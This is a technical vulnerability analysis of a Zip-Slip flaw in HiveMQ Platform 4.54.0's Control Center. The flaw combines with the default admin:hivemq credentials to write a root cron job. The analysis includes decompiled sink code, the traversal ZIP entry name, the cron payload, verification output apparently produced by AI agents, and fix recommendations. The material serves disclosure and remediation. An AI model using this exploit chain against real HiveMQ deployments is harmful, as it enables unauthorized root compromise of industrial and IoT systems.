# HiveMQ Platform Data Hub Zip-Slip to Root RCE - Technical Analysis

## 1. Overview

HiveMQ Platform 4.54.0 is a commercial MQTT messaging platform used for real-time device telemetry and command messaging in IoT and industrial deployments. Its Control Center (CC) web application runs on port 8080 and exposes a REST API under `/api/v1/*` (Jetty + RESTEasy, JAX-RS `HttpServletDispatcher` registered at `/api/*`). The Data Hub feature lets administrators upload "custom module" packages as Base64-encoded ZIP files. The ZIP extraction routine resolves each entry name with `path.resolve(zipEntry.getName())` and performs no canonicalization, containment, or traversal validation. An attacker authenticated with the shipped default credentials `admin:hivemq` can upload a ZIP whose entry names escape the extraction base directory (classic Zip-Slip, CWE-22), write a cron job into `/etc/cron.d/`, and obtain arbitrary command execution as `root` on unhardened (root-run) deployments.

## 2. Vulnerability Summary

The vulnerability is an arbitrary file write via Zip-Slip that leads to root code execution:

- **Root cause**: unsafe ZIP entry name resolution in the Data Hub custom module extraction routine
- **CWE**: CWE-22 (Zip-Slip / path traversal), CWE-798 (shipped default credentials), CWE-78 / CWE-94 (command / code execution), CWE-306 (default credentials act as missing authentication)
- **CVSS 3.1**: 9.8 Critical — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (PR:N because the shipped default credentials are usable without any password change)
- **Impact**: full host compromise as root on root-run deployments; at minimum arbitrary file write as the HiveMQ user on hardened deployments

## 3. Authentication Boundary

Control Center authenticates via `POST /api/v1/auth/authenticate` with a JSON body `{"userName":"admin","password":"hivemq"}`:

```
POST /api/v1/auth/authenticate HTTP/1.1
Content-Type: application/json

{"userName":"admin","password":"hivemq"}
```

Successful authentication returns `204 No Content` and sets the `hmq_cc_token` JWT cookie. The default account is active by default:

- `com/hivemq/configuration/entity/controlcenter/ControlCenterEntity`: `default-user-enabled=true`, `default-login-mechanism-enabled=true`, `users` empty
- `hmq/de/f.java` injects `control-center.default.user.name=admin` and a default password hash
- `hmq/dN/v.java` validates `sha256(userName + password)`; `sha256("admin"+"hivemq")` matches the shipped hash
- No `passwordChangeRequired` flag is returned; the default account has full admin privileges immediately

The default credentials are therefore an effective unauthenticated entry into the admin surface (CWE-798).

## 4. Attack Surface

| Item | Value |
|---|---|
| Control Center port | 8080 (Jetty) |
| Auth endpoint | `POST /api/v1/auth/authenticate` |
| Vulnerable endpoint | `POST /api/v1/cc-data-hub/module-instances/custom` |
| Protocol | HTTP JSON (REST) |
| Default credentials | `admin:hivemq` |

## 5. Sink Identification

The sink is the static extraction function `hmq.fO.c.a(InputStream, Path)` (decompiled from `hmq/fO/c.class`, lines 592-615):

```java
@VisibleForTesting
@Nullable
public static Path a(@NotNull InputStream inputStream, @NotNull Path path) {
    Path path2 = null;
    try (ZipInputStream zipInputStream = new ZipInputStream(inputStream);) {
        ZipEntry zipEntry;
        while ((zipEntry = zipInputStream.getNextEntry()) != null) {
            Path path3 = path.resolve(zipEntry.getName());   // line 597 - NO traversal validation
            if (!zipEntry.isDirectory()) {
                Path path4 = path3.getParent();
                if (!path4.toFile().exists()) {
                    Files.createDirectories(path4, ...);      // creates traversal parent dirs
                }
                Files.copy(zipInputStream, path3, StandardCopyOption.REPLACE_EXISTING);  // line 607
                continue;
            }
            Files.createDirectories(path3, ...);
        }
    }
    return path2;
}
```

This is a classic Zip-Slip sink: `path.resolve(zipEntry.getName())` concatenates the attacker-controlled entry name without canonicalization. `Files.createDirectories` creates the intermediate directories needed to traverse, and `Files.copy(..., REPLACE_EXISTING)` writes the payload to the escaped destination. A full-method grep for `startsWith|canonical|normalize|toRealPath|SecurityManager` returns zero hits.

## 6. Source Identification

The source is the HTTP endpoint `POST /api/v1/cc-data-hub/module-instances/custom` with JSON body `{"module":"<base64-zip>","instanceId":"...","moduleConfiguration":{...}}`. The DTO `hmq.dx.d` is a Jackson record:

```java
public record d(
    @JsonProperty(value="module", required=true) @NotNull String a,   // base64-encoded ZIP
    @JsonProperty(value="instanceId") @Nullable String b,
    @JsonProperty(value="moduleConfiguration") @Nullable Map<String,String> c
) {}
```

The JAX-RS interface `hmq.dJ.j` exposes `@POST @Path("/custom")` (`createCustomModuleInstance`). The ZIP entry names inside the Base64 payload are fully attacker-controlled and flow unmodified into the sink.

## 7. Data Flow

```
Attacker
  -> POST /api/v1/auth/authenticate (admin:hivemq)            -> 204 + hmq_cc_token JWT
  -> POST /api/v1/cc-data-hub/module-instances/custom
       {"module":"<base64 zip with ../../../../etc/cron.d/... entry>"}
  -> hmq.dK.ad.a(AsyncResponse, hmq.dx.d)                     (impl, ~line 185)
       - line 199: module required check
       - line 204: Base64.getDecoder().decode(module)         -> byte[]
       - line 212: hmq.fQ.c c2 = this.d.a("custom-module-"+..., byArray)
  -> hmq.fO.c.a(String, byte[])                               (impl, line 314)
       - base = <hivemq.home>/tmp/datahub/modules/custom/custom-module-N/
  -> hmq.fO.c.a(String, Path, InputStream)                    (line 326)
       - line 330: SINK CALL hmq.fO.c.a(InputStream, Path)    (extraction happens FIRST)
       - line 331: module structure validation (happens AFTER extraction)
  -> path.resolve("../../../../../../../../../../../etc/cron.d/hmqevil") escapes to /etc/cron.d/
  -> Files.copy writes cron job
  -> crond executes job as root -> marker file -> RCE
```

Key insight: extraction-before-validation. The sink at line 330 runs before the structure validation at line 331. When the malicious ZIP lacks `index.json`/`variables.json`, line 331 throws and the API returns 400, but the traversal file is already on disk; the catch block only deletes the `custom-module-N` directory and does not remove files written outside the base directory.

## 8. Exploit Construction

1. Authenticate and capture the `hmq_cc_token` JWT cookie.
2. Build a ZIP containing an entry named with enough `../` segments (the extraction base is 9 levels below the root, e.g. 12 `../` segments) to resolve to `/etc/cron.d/hmqevil_<rand>`:

   ```
   ../../../../../../../../../../../etc/cron.d/hmqevil_<rand>
   ```

   with content:

   ```
   * * * * * root sh -c '{ id; whoami; hostname; } > /tmp/<marker> 2>&1; echo ZSLIP_RCE_CONFIRMED >> /tmp/<marker>'
   ```

   plus a placeholder `module.json={}` entry so the ZIP is not empty.
3. Base64-encode the ZIP and POST it to `/api/v1/cc-data-hub/module-instances/custom`.
4. The API returns 400 (missing index.json) but the cron file is already written.
5. crond runs the job within one minute as root; the marker file confirms execution.

## 9. Dynamic Verification

The chain was verified dynamically against HiveMQ Platform 4.54.0 running as root (Java 21, crond active):

```
POST /api/v1/auth/authenticate -> HTTP 204 + Set-Cookie: hmq_cc_token=<JWT>
POST /api/v1/cc-data-hub/module-instances/custom
  -> HTTP 400 {"errors":[{"title":"Failed to load custom module: Could not read module due to missing 'index.json, variables.json' files"}]}

Target-side (independent SSH read-back):
  -rw-r--r-- 1 root root 136 <date> /etc/cron.d/hmqevil_df6086a2
  -rw-r--r-- 1 root root 88  <date> /tmp/hmq_zs_rce_df6086a2
  --- content ---
  uid=0(root) gid=0(root) groups=0(root)
  root
  <hostname>
  ZSLIP_RCE_CONFIRMED
```

The cron file is owned by root:root with mode 0644 (accepted by crond), and the marker shows `uid=0(root)`. Three independent verification runs (two by the primary agent, one by an independent re-analysis agent with a fresh marker) all returned uid=0.

## 10. Reachability & Impact

- **Authentication reachability**: the default `admin:hivemq` credentials work out of the box (CWE-798). Control Center binds 127.0.0.1 by default, but production deployments commonly bind 0.0.0.0 or place it behind a reverse proxy; reachability is assessed against the production deployment form.
- **License reachability**: the custom module feature is enabled by default in trial/paid deployments (module function gated only by commercial license, not a security boundary). Real paying customers are equally affected.
- **Sink reachability**: the full call chain `ad.a -> fO.c.a(String,byte[]) -> fO.c.a(String,Path,InputStream) -> fO.c.a(InputStream,Path)` has no intervening filter or validation.
- **Impact**: root RCE on root-run deployments (containers, development, unhardened production); on hardened `User=hivemq` deployments, arbitrary file write as the HiveMQ user still yields code execution (e.g. overwriting HiveMQ jars/classes).

## 11. Fix Recommendations

1. In `hmq.fO.c.a(InputStream, Path)`, validate each entry before writing: `Path normalized = path.resolve(name).normalize().toAbsolutePath(); if (!normalized.startsWith(path.toAbsolutePath())) throw ...` (standard canonical/startsWith Zip-Slip fix).
2. Extract only after module structure validation passes (or extract to a temp directory, validate, then atomically move; roll back traversal files on failure).
3. Remove the shipped default `admin:hivemq` credentials and force an administrator password at first startup.
4. Document that Control Center must sit behind an authenticated reverse proxy in production; keep the default localhost binding otherwise.

## 12. CWE / CVSS

- **CWE-22** — Zip-Slip arbitrary file write
- **CWE-798** — shipped hardcoded default credentials, no forced password change
- **CWE-78 / CWE-94** — command / code execution via cron
- **CWE-306** — default credentials act as missing authentication
- **CVSS 3.1**: **9.8 Critical** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
